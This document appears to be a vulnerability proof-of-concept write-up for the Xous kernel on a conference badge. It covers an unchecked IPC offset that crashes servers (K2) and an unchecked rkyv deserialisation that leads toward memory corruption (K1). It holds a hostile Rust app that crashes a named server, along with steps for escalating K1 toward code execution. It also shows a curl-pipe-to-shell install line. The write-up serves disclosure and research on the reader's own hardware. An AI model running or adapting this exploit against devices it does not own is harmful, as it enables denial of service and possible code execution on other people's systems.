# PoC 05 — crash any Xous server from an unprivileged app (kernel IPC)

Finding K2, `xous-core/xous-ipc/src/buffer.rs:114`, CWE-129, and the entry point to K1 (`buffer.rs:334`, CWE-502). Source-verified. This is the one that live-confirms the kernel primitive the whole chain rests on, and it needs a process running on the badge, so you build and sideload a Xous app.

## Mechanism

The `offset` field of an IPC memory message becomes a slice bound in the receiving server (`&self.slice[..self.used]`, `used = offset`) with no check against the mapped page length. Any process that can name a server can lend it one page and set `offset` past the end of it, and the server panics with nothing to restart it. K1 is the same trust failure taken further: `Buffer::to_original` calls `rkyv::access_unchecked` at that same sender-chosen offset, so a crafted archive at a chosen root position gives a memory-corruption primitive instead of just a panic.

## What you need

- Rust toolchain: `curl https://sh.rustup.rs -sSf | sh`, then the xous target per the xous-core README.
- Build a Xous image with your app added, and load it onto the badge (the dc34 build + `bunnie/dc34-image` upload path drives the same flow the badge documents for end users).

## App skeleton (K2, crash a server)

This is illustrative, not drop-in: pick a real target server name from the badge and adapt to the xous crate version in the tree. The load-bearing part is lending one page and setting `offset` larger than the page length.

```rust
// Minimal hostile Xous app: panic a named server via an out-of-range IPC offset.
fn main() -> ! {
    let xns = xous_names::XousNames::new().unwrap();
    // Target any server you can name. Start with a non-critical one.
    let cid = xns.request_connection_blocking("_target server name_").unwrap();

    // Lend exactly one page (4096 bytes).
    let page = xous::map_memory(
        None,
        None,
        4096,
        xous::MemoryFlags::R | xous::MemoryFlags::W,
    ).unwrap();

    // The bug: offset is copied through the kernel unchecked and used as a
    // slice bound in the receiver. Set it past the page end.
    let msg = xous::MemoryMessage {
        id: 0,
        buf: page,
        offset: core::num::NonZeroUsize::new(0x5000), // > 4096
        valid: core::num::NonZeroUsize::new(4096),
    };

    // Borrow (not Move): the receiver maps the page and slices [..offset].
    xous::send_message(cid, xous::Message::Borrow(msg)).ok();

    loop { xous::yield_slice(); }
}
```

## Steps

1. Build and flash a Xous image containing this app.
2. Run it against a non-critical server first and confirm that server terminates (K2).
3. Escalate toward K1: replace the offset-only payload with a crafted rkyv archive at a chosen offset and observe whether you can turn the type confusion into a controlled read/write in the target server. Confirming a controlled write here is what upgrades the whole chain to code execution.

## Safety

Crashing a server is a local DoS on your own badge, recoverable by reboot. Do not point this at a badge you do not own. Keep any K1 corruption work to your own hardware and to proving impact, not weaponization.
